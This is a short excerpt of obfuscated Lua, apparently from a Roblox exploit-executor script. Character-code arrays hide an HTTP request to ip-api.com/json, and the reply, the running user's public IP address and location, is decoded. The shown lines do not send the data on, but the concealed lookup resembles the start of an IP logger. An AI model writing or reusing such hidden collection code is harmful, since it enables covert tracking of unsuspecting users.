...
local _0x789xyz=syn.request({Url=string.char(104,116,116,112,58,47,47,105,112,45,97,112,105,46,99,111,109,47,106,115,111,110),Method=string.char(71,69,84)})
local _0x0p1q2r=game:GetService(string.char(72,116,116,112,83,101,114,118,105,99,101)):JSONDecode(_0x789xyz.Body)
